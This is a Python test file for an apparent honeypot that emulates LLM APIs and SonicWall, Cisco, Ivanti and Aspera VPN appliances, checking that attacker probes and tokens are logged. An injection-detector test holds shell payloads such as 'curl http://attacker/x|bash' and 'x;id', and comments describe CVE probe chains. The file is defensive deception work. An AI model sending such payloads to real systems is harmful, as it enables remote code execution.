    assert (model, prompt, action) == ("", "", "")


def test_extract_llm_prompt_non_json_content_type_ignored():
    """A form POST isn't an LLM request; don't try to parse it as one."""
    body = b"prompt=hello"
    assert tbenv.extract_llm_prompt(body, "application/x-www-form-urlencoded") == ("", "", "", False)


def test_extract_llm_prompt_truncates_long_prompt(monkeypatch):
    monkeypatch.setattr(tbenv, "LLM_BODY_DECODE_LIMIT", 32)
    payload = '{"model":"m","prompt":"' + ("A" * 500) + '"}'
    _, prompt, _, _ = tbenv.extract_llm_prompt(payload.encode(), "application/json")
    assert len(prompt) == 32


def test_render_openai_models_list_shape():
    import json
    body = tbenv.render_openai_models()
    payload = json.loads(body)
    assert payload["object"] == "list"
    assert isinstance(payload["data"], list) and payload["data"]
    ids = {m["id"] for m in payload["data"]}
    assert "gpt-4o-mini" in ids


def test_render_anthropic_models_list_shape():
    """Matches the Anthropic /v1/models response shape closely enough that
    a scanner filtering on `data[].id` sees Claude model IDs."""
    import json
    body = tbenv.render_anthropic_models()
    payload = json.loads(body)
    assert "data" in payload and payload["has_more"] is False
    ids = {m["id"] for m in payload["data"]}
    assert any(i.startswith("claude-") for i in ids)


def test_render_ollama_tags_shape():
    import json
    payload = json.loads(tbenv.render_ollama_tags())
    assert "models" in payload and payload["models"]
    first = payload["models"][0]
    for field in ("name", "modified_at", "size", "digest", "details"):
        assert field in first, f"missing {field}"


def test_render_ollama_version_shape():
    import json
    payload = json.loads(tbenv.render_ollama_version())
    assert "version" in payload


def test_render_openai_chat_embeds_model_name():
    import json
    payload = json.loads(tbenv.render_openai_chat("gpt-4o-canary"))
    assert payload["model"] == "gpt-4o-canary"
    assert payload["choices"][0]["message"]["role"] == "assistant"


def test_render_anthropic_message_shape():
    import json
    payload = json.loads(tbenv.render_anthropic_message("claude-3-5-sonnet-20241022"))
    assert payload["type"] == "message"
    assert payload["role"] == "assistant"
    assert payload["content"][0]["type"] == "text"


async def test_dispatch_get_openai_models_returns_json_list(flux_client):
    """First scanner probe — unauthenticated GET /v1/models. Look real."""
    resp = await flux_client.get(
        "/v1/models",
        headers={"X-Forwarded-For": "203.0.113.20", "User-Agent": "scanner/1.0"},
    )
    assert resp.status == 200
    assert "application/json" in resp.headers.get("Content-Type", "")
    body = await resp.json()
    assert body["object"] == "list"
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "llm-endpoint-models-list"
    assert entries[-1]["llmPath"] == "/v1/models"
    assert entries[-1]["llmHasAuth"] is False


async def test_dispatch_get_anthropic_models_logs_proxy_probe(flux_client):
    """GET /anthropic/v1/models from a scanner UA — the corporate AI-proxy
    probe shape. Logs the client IP and UA so follow-up probes can be linked."""
    resp = await flux_client.get(
        "/anthropic/v1/models",
        headers={
            "X-Forwarded-For": "203.0.113.10",
            "User-Agent": "Mozilla/5.0 (compatible; scanner/1.0)",
        },
    )
    assert resp.status == 200
    body = await resp.json()
    assert any(m["id"].startswith("claude-") for m in body["data"])
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "llm-endpoint-anthropic-models-list"
    assert entries[-1]["clientIp"] == "203.0.113.10"
    assert "scanner/1.0" in entries[-1]["userAgent"]


async def test_dispatch_post_openai_chat_captures_prompt_and_auth(flux_client):
    """The money shot: scanner sends a bearer token + a prompt, we log both."""
    import json
    resp = await flux_client.post(
        "/v1/chat/completions",
        headers={
            "X-Forwarded-For": "198.51.100.5",
            "Authorization": "Bearer sk-stolen-canary-abc123",
            "Content-Type": "application/json",
        },
        data=json.dumps({
            "model": "gpt-4o-mini",
            "messages": [{"role": "user", "content": "test if key works"}],
        }),
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["object"] == "chat.completion"
    assert body["model"] == "gpt-4o-mini"

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "llm-endpoint-openai-chat"
    assert entry["llmModel"] == "gpt-4o-mini"
    assert entry["llmAction"] == "chat"
    assert entry["llmHasAuth"] is True
    assert entry["llmAuthScheme"] == "bearer"
    assert "test if key works" in entry["llmPromptPreview"]


async def test_dispatch_post_ollama_generate_captures_prompt(flux_client):
    import json
    resp = await flux_client.post(
        "/api/generate",
        headers={
            "X-Forwarded-For": "198.51.100.6",
            "Content-Type": "application/json",
        },
        data=json.dumps({"model": "llama3.2:latest", "prompt": "say hi"}),
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["model"] == "llama3.2:latest"
    assert body["done"] is True
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "llm-endpoint-ollama-generate"
    assert entry["llmPromptPreview"] == "say hi"
    assert entry["llmHasAuth"] is False


async def test_dispatch_llm_endpoint_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "LLM_ENDPOINT_ENABLED", False)
    resp = await flux_client.get(
        "/v1/models",
        headers={"X-Forwarded-For": "203.0.113.99"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


async def test_dispatch_llm_endpoint_does_not_require_tracebit_key(flux_client, monkeypatch):
    """Like the webshell, the LLM trap has no upstream dep."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get("/api/version", headers={"X-Forwarded-For": "203.0.113.30"})
    assert resp.status == 200
    payload = await resp.json()
    assert "version" in payload


async def test_dispatch_llm_ollama_show_uses_model_from_body(flux_client):
    import json
    resp = await flux_client.post(
        "/api/show",
        headers={"X-Forwarded-For": "203.0.113.31", "Content-Type": "application/json"},
        data=json.dumps({"model": "qwen2.5-coder:7b"}),
    )
    assert resp.status == 200
    body = await resp.json()
    assert "qwen2.5-coder:7b" in body["modelfile"]


async def test_dispatch_llm_malformed_json_still_200(flux_client):
    """Scanner may send garbage; don't 500 — we want to look live."""
    resp = await flux_client.post(
        "/v1/chat/completions",
        headers={"X-Forwarded-For": "203.0.113.32", "Content-Type": "application/json"},
        data=b"{this is not json",
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "llm-endpoint-openai-chat"
    # Garbage body → no extracted prompt/model; still logged.
    assert entry["llmModel"] == ""
    assert "llmPromptPreview" not in entry


# --- LLM-endpoint expansion: bearer-token capture + SSE/NDJSON streaming ---


def test_extract_llm_prompt_detects_stream_flag():
    """SDK clients flag `"stream": true`; the trap branches on it."""
    body = b'{"model":"gpt-4o","stream":true,"messages":[{"role":"user","content":"hi"}]}'
    _, _, _, stream = tbenv.extract_llm_prompt(body, "application/json")
    assert stream is True


def test_extract_llm_prompt_default_stream_false():
    body = b'{"model":"gpt-4o","messages":[{"role":"user","content":"hi"}]}'
    _, _, _, stream = tbenv.extract_llm_prompt(body, "application/json")
    assert stream is False


def test_capture_llm_auth_token_bearer_preview_and_hash():
    sha, preview = tbenv.capture_llm_auth_token(
        "Bearer sk-proj-abcdefghijklmnopqrstuvwxyz1234", "",
    )
    # Hex sha256 over the raw token (sans "Bearer " prefix)
    assert sha == hashlib.sha256(b"sk-proj-abcdefghijklmnopqrstuvwxyz1234").hexdigest()
    # Preview keeps the prefix (12 chars) + last 4 — enough to group fleets by
    # known leak-source prefixes without storing the middle entropy in plaintext.
    assert preview.startswith("sk-proj-abcd")
    assert preview.endswith("1234")
    assert "..." in preview


def test_capture_llm_auth_token_x_api_key_fallback():
    sha, preview = tbenv.capture_llm_auth_token("", "ant-api03-XXXXXXXXXXXX1234")
    assert sha == hashlib.sha256(b"ant-api03-XXXXXXXXXXXX1234").hexdigest()
    assert preview.startswith("ant-api03-XX")


def test_capture_llm_auth_token_empty_returns_empty():
    assert tbenv.capture_llm_auth_token("", "") == ("", "")


def test_capture_llm_auth_token_short_token():
    """Short tokens still get a sha + a degraded preview, no exceptions."""
    sha, preview = tbenv.capture_llm_auth_token("Bearer short", "")
    assert sha == hashlib.sha256(b"short").hexdigest()
    assert preview  # non-empty


def test_render_openai_chat_sse_chunks_shape():
    chunks = tbenv.render_openai_chat_sse_chunks("gpt-4o-mini")
    blob = b"".join(chunks)
    assert blob.startswith(b"data: ")
    assert b"data: [DONE]\n\n" in blob
    assert b"chat.completion.chunk" in blob
    # final chunk before [DONE] has finish_reason=stop
    assert b'"finish_reason": "stop"' in blob


def test_render_anthropic_message_sse_chunks_shape():
    chunks = tbenv.render_anthropic_message_sse_chunks("claude-3-5-sonnet-20241022")
    blob = b"".join(chunks)
    assert b"event: message_start\n" in blob
    assert b"event: content_block_delta\n" in blob
    assert b"event: message_stop\n" in blob


def test_render_ollama_chat_ndjson_chunks_shape():
    chunks = tbenv.render_ollama_chat_ndjson_chunks("llama3.2:latest")
    # Each chunk is a single JSON line ending in '\n'
    for c in chunks:
        assert c.endswith(b"\n")
        json.loads(c)
    # Last chunk has done=True
    assert json.loads(chunks[-1])["done"] is True
    # All earlier chunks have done=False
    for c in chunks[:-1]:
        assert json.loads(c)["done"] is False


async def test_dispatch_openai_chat_streams_when_stream_true(flux_client):
    """When the client opts into streaming, return text/event-stream so real
    SDKs (which open the socket expecting SSE) don't bail on a JSON blob."""
    resp = await flux_client.post(
        "/v1/chat/completions",
        headers={
            "X-Forwarded-For": "198.51.100.50",
            "Authorization": "Bearer sk-stolen-canary-llmjack-9999",
            "Content-Type": "application/json",
        },
        data=json.dumps({
            "model": "gpt-4o-mini", "stream": True,
            "messages": [{"role": "user", "content": "Say OK in one word."}],
        }),
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("text/event-stream")
    body = await resp.read()
    assert b"data: [DONE]" in body
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "llm-endpoint-openai-chat"
    assert entry["llmStreamRequested"] is True
    assert entry["llmStreamChunks"] >= 3
    # Token capture: sha + safe preview, no full token leak.
    assert entry["llmAuthScheme"] == "bearer"
    assert entry["llmAuthTokenSha256"] == hashlib.sha256(
        b"sk-stolen-canary-llmjack-9999"
    ).hexdigest()
    assert entry["llmAuthTokenPreview"].startswith("sk-stolen-ca")


async def test_dispatch_openai_chat_no_stream_still_returns_json(flux_client):
    """Default (no stream flag) keeps the original single-blob JSON path."""
    resp = await flux_client.post(
        "/v1/chat/completions",
        headers={"X-Forwarded-For": "198.51.100.51", "Content-Type": "application/json"},
        data=json.dumps({
            "model": "gpt-4o-mini",
            "messages": [{"role": "user", "content": "hi"}],
        }),
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("application/json")
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["llmStreamRequested"] is False
    assert "llmStreamChunks" not in entry


async def test_dispatch_anthropic_messages_streams_event_stream(flux_client):
    """Anthropic SSE has a different envelope (`event: <name>\\ndata: ...`)."""
    resp = await flux_client.post(
        "/v1/messages",
        headers={
            "X-Forwarded-For": "198.51.100.52",
            "X-Api-Key": "ant-api03-test-token-1234567890ab",
            "Content-Type": "application/json",
        },
        data=json.dumps({
            "model": "claude-3-5-sonnet-20241022", "stream": True,
            "messages": [{"role": "user", "content": "ping"}],
        }),
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("text/event-stream")
    body = await resp.read()
    assert b"event: message_start" in body
    assert b"event: message_stop" in body
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "llm-endpoint-anthropic-message"
    assert entry["llmStreamRequested"] is True
    # x-api-key path also gets captured
    assert entry["llmAuthTokenSha256"] == hashlib.sha256(
        b"ant-api03-test-token-1234567890ab"
    ).hexdigest()


async def test_dispatch_ollama_chat_streams_ndjson(flux_client):
    """Ollama streams NDJSON (not SSE); each line is a JSON object."""
    resp = await flux_client.post(
        "/api/chat",
        headers={"X-Forwarded-For": "198.51.100.53", "Content-Type": "application/json"},
        data=json.dumps({
            "model": "llama3.2:latest", "stream": True,
            "messages": [{"role": "user", "content": "hi"}],
        }),
    )
    assert resp.status == 200
    assert resp.headers["Content-Type"].startswith("application/x-ndjson")
    body = await resp.read()
    lines = [ln for ln in body.split(b"\n") if ln]
    assert len(lines) >= 2
    parsed = [json.loads(ln) for ln in lines]
    assert parsed[-1]["done"] is True


async def test_dispatch_llm_no_auth_no_token_fields(flux_client):
    """When no Authorization / x-api-key header is sent, don't add token fields."""
    resp = await flux_client.post(
        "/v1/chat/completions",
        headers={"X-Forwarded-For": "198.51.100.54", "Content-Type": "application/json"},
        data=json.dumps({"model": "gpt-4o-mini", "messages": [{"role": "user", "content": "x"}]}),
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["llmHasAuth"] is False
    assert "llmAuthTokenSha256" not in entry
    assert "llmAuthTokenPreview" not in entry


# --- Fake SonicWall SSL VPN trap ---
#
# Two overlapping behaviour patterns observed in mid-April 2026:
#   - A dedicated SonicWall-precondition fleet hitting only
#     `/api/sonicos/is-sslvpn-enabled`.
#   - A broader enterprise-appliance probe running the full chain
#     `is-sslvpn-enabled` → `auth` → `tfa` on every target.


def test_sonicwall_enabled_by_default():
    assert tbenv.SONICWALL_ENABLED
    assert tbenv.CISCO_WEBVPN_ENABLED


def test_sonicwall_default_paths_cover_cve_2024_53704_chain():
    """Every path in the observed CVE-2024-53704 bait sequence must match."""
    for path in (
        "/api/sonicos/is-sslvpn-enabled",
        "/api/sonicos/auth",
        "/api/sonicos/tfa",
    ):
        assert tbenv.is_sonicwall_path(path), f"expected match: {path}"


def test_sonicwall_path_is_case_insensitive():
    assert tbenv.is_sonicwall_path("/API/SonicOS/Auth")


def test_sonicwall_path_non_match():
    for path in ["/", "/api/sonicos", "/api/sonicos/other", "/.env", "/sonicos/auth"]:
        assert not tbenv.is_sonicwall_path(path)


def test_sonicwall_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "SONICWALL_ENABLED", False)
    assert not tbenv.is_sonicwall_path("/api/sonicos/is-sslvpn-enabled")


def test_extract_sonicwall_username_json():
    body = b'{"user":"admin","password":"guess"}'
    assert tbenv.extract_sonicwall_username(body, "application/json") == "admin"


def test_extract_sonicwall_username_form():
    body = b"user=root&password=guess"
    assert tbenv.extract_sonicwall_username(body, "application/x-www-form-urlencoded") == "root"


def test_extract_sonicwall_username_alternate_keys():
    assert tbenv.extract_sonicwall_username(b'{"username":"u1"}', "application/json") == "u1"
    assert tbenv.extract_sonicwall_username(b'{"login":"u2"}', "application/json") == "u2"


def test_extract_sonicwall_username_empty_body():
    assert tbenv.extract_sonicwall_username(b"", "application/json") == ""


def test_extract_sonicwall_username_malformed_json():
    assert tbenv.extract_sonicwall_username(b"{not json", "application/json") == ""


def test_render_sonicwall_is_sslvpn_enabled_shape():
    import json
    payload = json.loads(tbenv.render_sonicwall_is_sslvpn_enabled())
    assert payload["is_ssl_vpn_enabled"] is True
    assert payload["status"]["success"] is True


def test_render_sonicwall_auth_success_embeds_session_id():
    import json
    payload = json.loads(tbenv.render_sonicwall_auth_success("sess-abc"))
    assert payload["auth"]["session_id"] == "sess-abc"
    assert payload["auth"]["tfa_required"] is True
    assert payload["status"]["success"] is True


def test_render_sonicwall_tfa_success_clears_tfa_required():
    import json
    payload = json.loads(tbenv.render_sonicwall_tfa_success("sess-xyz"))
    assert payload["auth"]["session_id"] == "sess-xyz"
    assert payload["auth"]["tfa_required"] is False


async def test_dispatch_sonicwall_is_sslvpn_enabled_returns_true(flux_client):
    """CVE-2024-53704 step 1: the precondition check. Scanner wants a 200 +
    boolean true to proceed to the auth POST."""
    resp = await flux_client.get(
        "/api/sonicos/is-sslvpn-enabled",
        headers={"X-Forwarded-For": "203.0.113.20", "User-Agent": "scanner/1.0"},
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["is_ssl_vpn_enabled"] is True

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "sonicwall-is-sslvpn-enabled"
    assert entry["sonicwallPath"] == "/api/sonicos/is-sslvpn-enabled"
    assert entry["sonicwallMethod"] == "GET"
    assert entry["clientIp"] == "203.0.113.20"


async def test_dispatch_sonicwall_auth_post_captures_username_and_body(flux_client):
    """The money shot: scanner POSTs credentials, we log the username and
    the full body hash for post-hoc replay analysis."""
    import json
    resp = await flux_client.post(
        "/api/sonicos/auth",
        headers={
            "X-Forwarded-For": "203.0.113.21",
            "Content-Type": "application/json",
        },
        data=json.dumps({"user": "admin", "password": "admin"}),
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["status"]["success"] is True
    assert body["auth"]["tfa_required"] is True
    assert body["auth"]["session_id"]

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "sonicwall-auth"
    assert entry["sonicwallUsername"] == "admin"
    assert entry["sonicwallMethod"] == "POST"
    assert entry["bodySha256"]
    assert "admin" in entry["bodyPreview"]
    assert "password" in entry["bodyPreview"]


async def test_dispatch_sonicwall_tfa_post_captures_payload(flux_client):
    """Step 3 of the chain: TFA bypass. Log whatever the scanner sends."""
    import json
    resp = await flux_client.post(
        "/api/sonicos/tfa",
        headers={
            "X-Forwarded-For": "203.0.113.21",
            "Content-Type": "application/json",
        },
        data=json.dumps({"code": "000000", "session_id": "replayed"}),
    )
    assert resp.status == 200
    body = await resp.json()
    assert body["auth"]["tfa_required"] is False

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "sonicwall-tfa"
    assert "000000" in entry["bodyPreview"]


async def test_dispatch_sonicwall_form_body_username(flux_client):
    """Some SonicOS clients send x-www-form-urlencoded instead of JSON."""
    resp = await flux_client.post(
        "/api/sonicos/auth",
        headers={
            "X-Forwarded-For": "203.0.113.40",
            "Content-Type": "application/x-www-form-urlencoded",
        },
        data="user=root&password=abc",
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["sonicwallUsername"] == "root"


async def test_dispatch_sonicwall_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "SONICWALL_ENABLED", False)
    resp = await flux_client.get(
        "/api/sonicos/is-sslvpn-enabled",
        headers={"X-Forwarded-For": "203.0.113.41"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


async def test_dispatch_sonicwall_does_not_require_tracebit_key(flux_client, monkeypatch):
    """Like webshell/LLM, no upstream dep — the intel is the probe itself."""
    monkeypatch.setattr(tbenv, "API_KEY", "")
    resp = await flux_client.get(
        "/api/sonicos/is-sslvpn-enabled",
        headers={"X-Forwarded-For": "203.0.113.42"},
    )
    assert resp.status == 200


async def test_dispatch_sonicwall_detects_session_cookie(flux_client):
    """If a scanner replays a harvested SonicOS session cookie, flag it —
    that's a stronger compromise signal than a cold probe."""
    resp = await flux_client.get(
        "/api/sonicos/is-sslvpn-enabled",
        headers={
            "X-Forwarded-For": "203.0.113.43",
            "Cookie": "swap_session=stolen-abc; other=x",
        },
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["sonicwallHasAuth"] is True


async def test_dispatch_sonicwall_malformed_json_still_200(flux_client):
    """Scanner may send garbage; don't 500."""
    resp = await flux_client.post(
        "/api/sonicos/auth",
        headers={"X-Forwarded-For": "203.0.113.44", "Content-Type": "application/json"},
        data=b"{broken",
    )
    assert resp.status == 200
    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "sonicwall-auth"
    assert entry["sonicwallUsername"] == ""


# --- Fake Cisco WebVPN trap ---


def test_cisco_webvpn_enabled_by_default():
    assert tbenv.CISCO_WEBVPN_ENABLED


def test_cisco_webvpn_default_paths_match_observed_sequence():
    for path in (
        "/+CSCOE+/logon.html",
        "/+CSCOE+/logon_forms.js",
        "/+CSCOL+/Java.jar",
        "/+CSCOL+/a1.jar",
    ):
        assert tbenv.is_cisco_webvpn_path(path), f"expected match: {path}"


def test_cisco_webvpn_path_non_match():
    for path in ["/", "/+CSCOE+/", "/+CSCOE+/logon.php", "/+CSCOL+/", "/.env"]:
        assert not tbenv.is_cisco_webvpn_path(path)


def test_cisco_webvpn_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "CISCO_WEBVPN_ENABLED", False)
    assert not tbenv.is_cisco_webvpn_path("/+CSCOE+/logon.html")


def test_render_cisco_webvpn_logon_forms_js_shape():
    body = tbenv.render_cisco_webvpn_logon_forms_js().decode("utf-8")
    assert "window.webvpn" in body


async def test_dispatch_cisco_webvpn_logon_html(flux_client):
    resp = await flux_client.get(
        "/+CSCOE+/logon.html",
        headers={"X-Forwarded-For": "203.0.113.51", "Host": "vpn.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Secure Access SSL VPN" in text
    assert "/+CSCOE+/logon_forms.js" in text

    entries = _log_entries(flux_client.log_path)
    entry = entries[-1]
    assert entry["result"] == "cisco-webvpn-logon"
    assert entry["ciscoWebvpnPath"] == "/+CSCOE+/logon.html"


async def test_dispatch_cisco_webvpn_logon_post_logs_username_not_password(flux_client):
    resp = await flux_client.post(
        "/+CSCOE+/logon.html",
        data="Login=Login&buttonClicked=4&password=123&username=admin",
        headers={
            "X-Forwarded-For": "203.0.113.54",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cisco-webvpn-logon"
    assert entry["ciscoWebvpnUsername"] == "admin"
    assert entry["ciscoWebvpnHasPassword"] is True
    assert "password" not in entry


async def test_dispatch_anyconnect_config_auth_root_post(flux_client):
    xml = b"""<?xml version="1.0" encoding="UTF-8"?>
<config-auth client="vpn" type="init" aggregate-auth-version="2">
  <version who="vpn">4.10.07073</version>
  <device-id device-type="iPhone13,1">iOS</device-id>
</config-auth>"""
    resp = await flux_client.post(
        "/",
        data=xml,
        headers={
            "X-Forwarded-For": "203.0.113.55",
            "Host": "vpn.example",
            "Content-Type": "application/xml",
        },
    )
    assert resp.status == 200
    body = await resp.text()
    assert "<config-auth" in body
    assert "/+CSCOE+/logon.html" in body
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "cisco-anyconnect-config-auth"
    assert entry["ciscoWebvpnPath"] == "/"
    assert entry["ciscoAnyconnectVersion"] == "4.10.07073"


async def test_dispatch_cisco_webvpn_jar(flux_client):
    resp = await flux_client.get("/+CSCOL+/Java.jar", headers={"X-Forwarded-For": "203.0.113.52"})
    assert resp.status == 200
    body = await resp.read()
    assert body.startswith(b"PK")

    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "cisco-webvpn-java-jar"


async def test_dispatch_cisco_webvpn_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "CISCO_WEBVPN_ENABLED", False)
    resp = await flux_client.get("/+CSCOE+/logon.html", headers={"X-Forwarded-For": "203.0.113.53"})
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Fake Ivanti Connect Secure / Pulse Secure trap ---


def test_ivanti_vpn_enabled_by_default():
    assert tbenv.IVANTI_VPN_ENABLED


def test_ivanti_vpn_default_paths_match_observed_sequence():
    for path in (
        "/dana-na/auth/url_default/welcome.cgi",
        "/dana-na/auth/url_admin/welcome.cgi",
        "/dana-na/auth/welcome.cgi",
        "/dana-na/auth/url_default/login.cgi",
        "/dana-cached/hc/HostCheckerInstaller.osx",
        "/dana-cached/hc/HostCheckerInstaller.exe",
        "/dana-cached/hc/HostCheckerInstaller.dmg",
        "/dana-ws/namedusers",
    ):
        assert tbenv.is_ivanti_vpn_path(path), f"expected match: {path}"


def test_ivanti_vpn_path_non_match():
    for path in [
        "/",
        "/dana-na/",
        "/dana-na/auth/",
        "/dana-na/auth/login.cgi",  # missing url_default/
        "/dana-cached/hc/",
        "/dana-cached/hc/HostCheckerInstaller.tar",  # unsupported suffix
        "/.env",
    ]:
        assert not tbenv.is_ivanti_vpn_path(path), f"unexpected match: {path}"


def test_ivanti_vpn_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "IVANTI_VPN_ENABLED", False)
    assert not tbenv.is_ivanti_vpn_path("/dana-na/auth/url_default/welcome.cgi")


def test_render_ivanti_welcome_html_shape():
    body = tbenv.render_ivanti_welcome_html("vpn.example").decode("utf-8")
    assert "Ivanti Connect Secure" in body
    assert "/dana-na/auth/url_default/login.cgi" in body
    assert "vpn.example" in body


def test_render_ivanti_hostchecker_stub_magic_bytes():
    osx = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.osx")
    assert osx.startswith(b"\xcf\xfa\xed\xfe"), "macOS stub should carry Mach-O magic"
    exe = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.exe")
    assert exe.startswith(b"MZ"), "Windows stub should carry PE/DOS magic"
    dmg = tbenv.render_ivanti_hostchecker_stub("HostCheckerInstaller.dmg")
    assert dmg.startswith(b"koly"), "DMG stub should carry koly magic"


def test_render_ivanti_namedusers_json_shape():
    body = tbenv.render_ivanti_namedusers_json()
    payload = json.loads(body)
    assert payload["result"] == "success"
    assert payload["data"]["users"] == []


def test_extract_ivanti_form_username_and_password_presence():
    body = b"realm=Users&username=admin&password=h%26unter2&btnSubmit=Sign+In"
    username, has_password = tbenv.extract_ivanti_form(body, "application/x-www-form-urlencoded")
    assert username == "admin"
    assert has_password is True


def test_ivanti_has_cmd_injection_indicators():
    # Several CVE-2024-21887 PoCs ship classic shell-meta payloads in the
    # JSON body posted to /dana-ws/namedusers.
    assert tbenv._ivanti_has_cmd_injection("uname -a; id", "")
    assert tbenv._ivanti_has_cmd_injection("", "id=$(id)")
    assert tbenv._ivanti_has_cmd_injection("curl http://attacker/x|bash", "")
    assert not tbenv._ivanti_has_cmd_injection("plain string", "username=admin")


async def test_dispatch_ivanti_welcome(flux_client):
    resp = await flux_client.get(
        "/dana-na/auth/url_default/welcome.cgi",
        headers={"X-Forwarded-For": "203.0.113.71", "Host": "vpn.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "Ivanti Connect Secure" in text
    assert "/dana-na/auth/url_default/login.cgi" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ivanti-welcome"
    assert entry["ivantiPath"] == "/dana-na/auth/url_default/welcome.cgi"


async def test_dispatch_ivanti_login_post_logs_username_and_sets_dsid_cookie(flux_client):
    resp = await flux_client.post(
        "/dana-na/auth/url_default/login.cgi",
        data="realm=Users&username=admin&password=h%26unter2&btnSubmit=Sign+In",
        headers={
            "X-Forwarded-For": "203.0.113.72",
            "Content-Type": "application/x-www-form-urlencoded",
        },
    )
    assert resp.status == 200
    set_cookie = resp.headers.get("Set-Cookie", "")
    assert "DSID=" in set_cookie
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ivanti-login-post"
    assert entry["ivantiUsername"] == "admin"
    assert entry["ivantiHasPassword"] is True
    assert "password" not in entry


async def test_dispatch_ivanti_hostchecker_installer(flux_client):
    resp = await flux_client.get(
        "/dana-cached/hc/HostCheckerInstaller.osx",
        headers={"X-Forwarded-For": "203.0.113.73"},
    )
    assert resp.status == 200
    body = await resp.read()
    assert body.startswith(b"\xcf\xfa\xed\xfe")
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ivanti-hostchecker-installer"


async def test_dispatch_ivanti_namedusers_flags_cmd_injection(flux_client):
    resp = await flux_client.post(
        "/dana-ws/namedusers",
        data=b'{"name":"x;id"}',
        headers={
            "X-Forwarded-For": "203.0.113.74",
            "Content-Type": "application/json",
        },
    )
    assert resp.status == 200
    payload = await resp.json()
    assert payload["result"] == "success"
    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "ivanti-namedusers"
    assert entry["ivantiHasCmdInjection"] is True


async def test_dispatch_ivanti_disabled_returns_404(flux_client, monkeypatch):
    monkeypatch.setattr(tbenv, "IVANTI_VPN_ENABLED", False)
    resp = await flux_client.get(
        "/dana-na/auth/url_default/welcome.cgi",
        headers={"X-Forwarded-For": "203.0.113.75"},
    )
    assert resp.status == 404
    entries = _log_entries(flux_client.log_path)
    assert entries[-1]["result"] == "not-handled"


# --- Fake IBM Aspera Faspex trap ---


def test_aspera_faspex_enabled_by_default():
    assert tbenv.ASPERA_FASPEX_ENABLED


def test_aspera_faspex_default_paths_match_observed_sequence():
    for path in (
        "/aspera/faspex/",
        "/aspera/faspex",
        "/aspera/faspex/account/logout",
        "/aspera/faspex/package_relay/relay_package",
    ):
        assert tbenv.is_aspera_faspex_path(path), f"expected match: {path}"


def test_aspera_faspex_path_non_match():
    for path in (
        "/",
        "/aspera/",
        "/aspera/faspex/account/login",
        "/aspera/faspex/admin",
        "/.env",
    ):
        assert not tbenv.is_aspera_faspex_path(path), f"unexpected match: {path}"


def test_aspera_faspex_disabled_returns_false(monkeypatch):
    monkeypatch.setattr(tbenv, "ASPERA_FASPEX_ENABLED", False)
    assert not tbenv.is_aspera_faspex_path("/aspera/faspex/")


def test_render_aspera_faspex_landing_shape():
    body = tbenv.render_aspera_faspex_landing("faspex.example", "4.4.1").decode("utf-8")
    assert "IBM Aspera Faspex" in body
    assert "Version 4.4.1" in body
    assert "/aspera/faspex/session" in body
    assert "faspex.example" in body


def test_render_aspera_logout_json_shape():
    payload = json.loads(tbenv.render_aspera_logout_json())
    assert payload["status"] == "ok"
    assert payload["message"] == "signed out"
    assert payload["csrf"]


async def test_dispatch_aspera_faspex_landing(flux_client):
    resp = await flux_client.get(
        "/aspera/faspex/",
        headers={"X-Forwarded-For": "203.0.113.81", "Host": "faspex.example"},
    )
    assert resp.status == 200
    text = await resp.text()
    assert "IBM Aspera Faspex" in text

    entry = _log_entries(flux_client.log_path)[-1]
    assert entry["result"] == "aspera-faspex-landing"
    assert entry["asperaFaspexPath"] == "/aspera/faspex/"


async def test_dispatch_aspera_faspex_logout_captures_body_preview(flux_client):
    resp = await flux_client.post(
